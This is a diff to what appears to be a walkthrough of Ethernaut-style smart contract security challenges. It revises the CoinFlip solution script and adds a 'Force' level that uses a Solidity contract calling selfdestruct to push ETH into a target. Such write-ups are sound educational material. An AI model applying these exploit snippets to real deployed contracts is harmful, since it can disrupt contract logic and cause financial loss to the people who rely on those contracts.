@@ -49,8 +49,10 @@ abstract contract CoinFlip {
 }
 ```
 
-We can pair the contract with a simple script that calls our `attack` method the requisite amount of times, ensuring each subsequent call happens only after the previous has been mined. We cannot simply do this in the `Level3` contract above as the block number must be different between flips as enforced in the original CoinFlip contract. Using Metamask as our provider is annoying here because we must provide manual confirmation for each transaction, so we will use ethers locally:
+We can pair the contract with a simple script that calls our `attack` method the requisite amount of times, ensuring each subsequent call happens only after the previous has been mined. We cannot simply do this in the `Level3` contract above as the block number must be different between flips as enforced in the original CoinFlip contract. Using Metamask as our provider is annoying here because we must provide manual confirmation for each transaction, so we will use Alchemy with a local script:
 ```typescript
+import { ethers } from "ethers";
+
 const contract = await ethers.getContractAt(
   'Level3', 
   LEVEL3_CONTRACT_ADDR, 
@@ -101,5 +103,26 @@ await contract.transfer('0x0000000000000000000000000000000000000000', 50);
 await contract.sendTransaction({
   to: INSTANCE_ADDRESS,
   data: web3.eth.abi.encodeFunctionSignature('pwn()'),
+});
+```
+
+### 7. Force
+Even if a contract has no payable functions and no fallback function, it is still possible to increase its balance by designating it as the recipient of a self-destructed contract's funds. We can exploit this by creating a simple payable function that simply passes the given ETH to the `Force` contract after self-destructing.
+```solidity
+pragma solidity ^0.8.0;
+
+contract Level7 {
+  function attack() public payable {
+    selfdestruct(payable(INSTANCE_ADDRESS));
+  }
+}
+```
+
+```typescript
+await sendTransaction({
+  to: LEVEL7_CONTRACT_ADDRESS, 
+  from: WALLET_ADDRESS, 
+  data: web3.eth.abi.encodeFunctionSignature('attack()'), 
+  value: 1
 });
 ```
